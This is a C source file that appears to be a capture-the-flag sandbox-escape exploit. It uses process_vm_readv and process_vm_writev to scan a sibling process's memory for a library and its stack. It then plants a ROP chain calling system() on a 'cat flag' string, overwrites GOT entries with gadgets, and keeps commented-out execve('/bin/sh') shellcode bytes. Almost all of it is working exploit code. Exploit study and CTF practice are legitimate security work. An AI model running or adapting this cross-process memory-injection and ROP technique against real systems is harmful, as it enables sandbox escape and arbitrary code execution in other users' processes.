typedef unsigned char uint8_t;
_Static_assert(sizeof(uint8_t) == 1, "uint8_t wrong size");
typedef unsigned short uint16_t;
_Static_assert(sizeof(uint16_t) == 2, "uint16_t wrong size");
typedef unsigned int uint32_t;
_Static_assert(sizeof(uint32_t) == 4, "uint32_t wrong size");
typedef unsigned long long uint64_t;
_Static_assert(sizeof(uint64_t) == 8, "uint64_t wrong size");
typedef unsigned int size_t;
typedef int ssize_t;

#define NULL ((void*)0x0)
#define pid_t unsigned long
#define true 1
#define false 0
#define SYS_exit 1
#define SYS_read 0
#define SYS_write 1
#define SYS_getpid 39
#define SYS_process_vm_readv 310
#define SYS_process_vm_writev 311

struct iovec {
    uint64_t iov_base;    /* Starting address */
    size_t iov_len;     /* Number of bytes to transfer */
};


int main();
void __attribute__((noreturn)) exit(int);

void* memset(void* dst, int val, size_t size) {
    for (size_t i = 0; i < size; i++) {
        ((uint8_t*)dst)[i] = val;
    }
    return dst;
}

void* memcpy(void* dst, const void* src, size_t size) {
    for (size_t i = 0; i < size; i++) {
        ((uint8_t*)dst)[i] = ((uint8_t*)src)[i];
    }
    return dst;
}

ssize_t read(int _fd, void* _buf, size_t _len) {
    register int fd asm("rdi") = _fd;
    register void* buf asm("rsi") = _buf;
    register size_t len asm("rdx") = _len;
    register int syscall asm("rax") = SYS_read;
    register ssize_t ret asm("rax");
    asm volatile("syscall" : "=r"(ret) : "r"(fd), "r"(buf), "r"(len), "r"(syscall) : "memory");
    return ret;
}

void write(int _fd, const void* _buf, size_t _len) {
    register int fd asm("rdi") = _fd;
    register const void* buf asm("rsi") = _buf;
    register size_t len asm("rdx") = _len;
    register int syscall asm("rax") = SYS_write;
    asm volatile("syscall" :: "r"(fd), "r"(buf), "r"(len), "r"(syscall) : "memory");
}

void kill(uint64_t _pid, uint64_t _sig)
{
    register uint64_t pid asm("rdi") = _pid;
    register uint64_t sig asm("rsi") = _sig;
    register int syscall asm("rax") = 200;

    asm volatile("syscall" :: "r"(pid), "r"(sig), "r"(syscall) : "memory");
}

uint64_t getpid()
{
    register int syscall asm("rax") = SYS_getpid;
    register uint64_t ret asm("rax");
    asm volatile("syscall" : "=r"(ret) :"r"(syscall) : "memory");
    return ret;
}

void __attribute__((noreturn)) exit(int _code) {
    register int code asm("rdi") = _code;
    register int syscall asm("rax") = SYS_exit;
    asm volatile("syscall" ::"r"(syscall) : "memory");
    __builtin_unreachable();
}

ssize_t process_vm_readv(pid_t _pid,
        const struct iovec *_local_iov,
        unsigned long _liovcnt,
        const struct iovec *_remote_iov,
        unsigned long _riovcnt,
        unsigned long _flags) {
    register pid_t pid asm("rdi") = _pid;
    register struct iovec* local_iov asm("rsi") = _local_iov;
    register unsigned long liovcnt asm("rdx") = _liovcnt;
    register struct iovec* remote_iov asm("r10") = _remote_iov;
    register unsigned long riovcnt asm("r8") = _riovcnt;
    register unsigned long flags asm("r9") = _flags;
    register int syscall asm("rax") = SYS_process_vm_readv;
    register ssize_t ret asm("rax");
    asm volatile("syscall" : "=r"(ret) : "r"(pid), "r"(local_iov), "r"(liovcnt),  "r"(remote_iov),
            "r"(riovcnt), "r"(flags), "r"(syscall) : "memory");
    return ret;
}

ssize_t process_vm_writev(pid_t _pid,
        const struct iovec *_local_iov,
        unsigned long _liovcnt,
        const struct iovec *_remote_iov,
        unsigned long _riovcnt,
        unsigned long _flags) {
    register pid_t pid asm("rdi") = _pid;
    register struct iovec* local_iov asm("rsi") = _local_iov;
    register unsigned long liovcnt asm("rdx") = _liovcnt;
    register struct iovec* remote_iov asm("r10") = _remote_iov;
    register unsigned long riovcnt asm("r8") = _riovcnt;
    register unsigned long flags asm("r9") = _flags;
    register int syscall asm("rax") = SYS_process_vm_writev;
    register ssize_t ret asm("rax");
    asm volatile("syscall" : "=r"(ret) : "r"(pid), "r"(local_iov), "r"(liovcnt),  "r"(remote_iov),
            "r"(riovcnt), "r"(flags), "r"(syscall) : "memory");
    return ret;
}

uint64_t getrsp()
{
  __asm__ ("movq %rsp, %rax");
}

extern uint8_t _bss;
extern uint8_t _ebss;
uint64_t g_libsandbox;
uint64_t g_libc;
// write to the previously determined rwx pages in the java process
struct iovec remote_vec = { (void*)0x800000000, 50 };
// read from a local shellcode buf
char buf[] = {'A', 'B', 'C', 'D', '\n'}; //{106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5};
//struct iovec local_vec = { &buf[0], 50 };

void __attribute__((noreturn)) __attribute__((section(".text.start"))) _start(uint64_t libsandbox) {
    
    g_libsandbox = libsandbox;
    g_libc = libsandbox - 0x1f2000;
    //remote_vec.iov_base = 0x400000;// + 0x1460;
    //remote_vec.iov_len = 4;
    //local_vec.iov_base = (uint64_t) buf;
    //local_vec.iov_len = (uint64_t) 4;
    
    // go to main!
    exit(main());
}

void write_ulong(uint64_t x)
{
    char tmp[256];
    char c;
    int i = 0;
    c = (x%16);
    if (c < 10)
        tmp[0] = c + 0x30;
    else
        tmp[0] = c - 10 + 'a';
    while ((x /= 16) != 0)
    {
        i += 1;
        c = (x%16);
        if (c < 10)
            tmp[i] = c + 0x30;
        else
            tmp[i] = c - 10 + 'a';
    }
    while (i >= 0)
    {
        write(1, &tmp[i--], 1);
    }
    c = 0xa;
    write(1, &c, 1);
    
}



//void infect(unsigned long pid)
//{
//    ssize_t ret = process_vm_readv(pid, &local_vec, 1, &remote_vec, 1, 0);
//    if (ret <= 0) {
//        write(1, "bad ret!: ", 10);
//        write_ulong(-ret);
//        //write(1, "\n", 1);
//    } else {
//        write(1, "GOOD RET\n", 9);
//    }
//    write(1, buf, 5);
//    return;
//}

uint64_t g_val;
struct iovec g_local_vec  = { (uint64_t) &g_val , 8 };
struct iovec g_remote_vec = { 0, 8 };

uint64_t remote_read64(uint64_t pid, uint64_t addr)
{

    write(1, "reading: ", 9);
    write_ulong(addr);
    
    g_remote_vec.iov_base = addr;
    ssize_t ret = process_vm_readv(pid, &g_local_vec, 1, &g_remote_vec, 1, 0);
    if (ret <= 0) {
        write(1, "bad ret!: ", 10);
        write_ulong(-ret);
        //write(1, "\n", 1);
    } else {
        //write(1, "GOOD RET\n", 9);
    }

    return g_val;
}

ssize_t remote_write64(uint64_t pid, uint64_t addr, uint64_t val)
{

    //write(1, "writing to: ", 12);
    //write_ulong(addr);
    
    g_val = val;
    g_remote_vec.iov_base = addr;
    ssize_t ret = process_vm_writev(pid, &g_local_vec, 1, &g_remote_vec, 1, 0);
    if (ret <= 0) {
        write(1, "bad ret!: ", 10);
        write_ulong(-ret);
        //write(1, "\n", 1);
    } else {
        //write(1, "GOOD RET\n", 9);
    }

    return -ret;

}

uint64_t scanpages64(uint64_t apid, uint64_t page, uint64_t expected, uint64_t increment)
{
    write(1, "Scanning memory from: ", 22);
    write_ulong(page);
    write_ulong(expected);
    
    for (;;)
    {
        //write_ulong((uint64_t) page);
        uint64_t val = remote_read64(apid, page);
        if (val == expected)
            break;
        page += increment;
    }
    
    return page;
}

// 0x000000000005e650: mov rsp, rdx; ret;
// stack_pivot = g_libc + 0x5e650;

int main() {
    //asm("int3");
    uint64_t sbxpid = getpid() + 1;
    write_ulong(sbxpid);
    uint64_t real_libsbx = scanpages64(sbxpid, g_libc + 0x1ee000, 0x00010102464c457f, 0x1000);
    write(1, "found realsbx: ", 15);
    write_ulong(real_libsbx);
    
    uint64_t sbxsp = scanpages64(sbxpid, getrsp(), real_libsbx + 0x1309, -0x8);
    write(1, "found sbxsp: ", 13);
    write_ulong(sbxsp);
    
    int i;
    //for ( i = 0; i < 0x10000; ++i)
    //{
    //    uint64_t rv = (remote_write64(sbxpid, sbxsp+i*8, 0x41));
    //    
    //    if (rv == 0xe)
    //        break;
    //}
    //write_ulong(i);
    
    for ( i = 0; i < 0x10000; ++i)
    {
        
        // ret = 0x40101a
        uint64_t rv = remote_write64(sbxpid, sbxsp-i*8, 0x40101a); // ret spray
        
        if (rv == 0xe)
            break;
    }
    i = 199;

    #define POP_RDI 0x401273
    #define POP_RSI_R15 0x401271
    #define POP_RDX_RBX g_libc + 0x162d98
    #define PUTS 0x401074
    #define BINSH 0x404500
    #define BINSHHEX 0x0068732f6e69622f
    #define BINLSHEX 0x00736c2f6e69622f
    #define SYSTEM 0x55410
    #define EXECVE 0xe62f0
    #define ENVIRON g_libc + 0x1ef2e0


    remote_write64(sbxpid, BINSH + 8*0, 0x67616c6620746163);
    remote_write64(sbxpid, BINSH + 8*1, 0x643461393963632d);
    remote_write64(sbxpid, BINSH + 8*2, 0x6666333364346565);
    remote_write64(sbxpid, BINSH + 8*3, 0x6433363566643063);
    remote_write64(sbxpid, BINSH + 8*4, 0x3463336631303164);
    remote_write64(sbxpid, BINSH + 8*5, 0x0000007478742e30);

    //remote_write64(sbxpid, BINSH, BINLSHEX);
    remote_write64(sbxpid, ENVIRON, 0x0);

    remote_write64(sbxpid, sbxsp-(i--)*8, POP_RDI);
    remote_write64(sbxpid, sbxsp-(i--)*8, BINSH);

    //remote_write64(sbxpid, sbxsp-(i--)*8, POP_RSI_R15);
    //remote_write64(sbxpid, sbxsp-(i--)*8, 0);
    //remote_write64(sbxpid, sbxsp-(i--)*8, 0);
    //
    //remote_write64(sbxpid, sbxsp-(i--)*8, POP_RDX_RBX);
    //remote_write64(sbxpid, sbxsp-(i--)*8, 0);
    //remote_write64(sbxpid, sbxsp-(i--)*8, 0);

    remote_write64(sbxpid, sbxsp-(i--)*8, g_libc + SYSTEM);
    //i = 204;
    //remote_write64(sbxpid, sbxsp-i*8, 0x41);
    //i--;
    //remote_write64(sbxpid, sbxsp-i*8, 0x42);
    //i--;
    //remote_write64(sbxpid, sbxsp-i*8, 0x43);
    

    write_ulong(i);

    //for (uint64_t p = sbxpid; p < sbxpid + 10; ++p)
    //{
    //write_ulong(remote_read64(sbxpid, real_libsbx));
    //write_ulong(remote_read64(sbxpid, real_libsbx + 0x4018));
    //remote_write64(sbxpid, real_libsbx + 0x4018, g_libc + 0xe6c7e); // oneg
    /*
      001011ce 48 81 ec     SUB            RSP,0xa0
               a0 00 00 
               00
      001011d5 48 8b 05     MOV            RAX,qword ptr [->stdin]                    = 00105018
               04 2e 00 
               00
      001011dc 48 8b 38     MOV            RDI,qword ptr [RAX]=>stdin                 = ??
      001011df e8 8c ff     CALL           <EXTERNAL>::setvbuf                        int setvbuf(FILE * __stream,
               ff ff

    */
    remote_write64(sbxpid, real_libsbx + 0x4018, real_libsbx + 0x11ce); // puts@got = this gadget
    remote_write64(sbxpid, real_libsbx + 0x4050, 0x401273); // setvbuf@got = poprdi_ret -> will stack pivot to &0x10d
    //remote_write64(sbxpid, real_libsbx + 0x2058, 0x0042434445565700);
    //remote_write64(sbxpid, sbxsp-16, 0x41);
    //remote_write64(sbxpid, sbxsp-8, 0x42);
    //remote_write64(sbxpid, sbxsp, 0x43);
    //}
    // oneg = g_libc + 0xe6c7e;
    // libsandbox_puts_got = libsandbox + 0x4018;
    //write_ulong(remote_read64(sbxpid, sbxsp));
    kill(sbxsp, 18);
    //uint64_t *res = scanmem64(getrsp(), g_libsandbox + 0x1309);
    //write_ulong((uint64_t)res);
    for(;;)
    {

    }
    //write_ulong((uint64_t) g_libsandbox);
    //for (uint64_t i = 1 ; i < 10; ++i)
    //{
    //    write_ulong(pid+i);
    //    infect(pid+i);
    //}

    return 120;
}
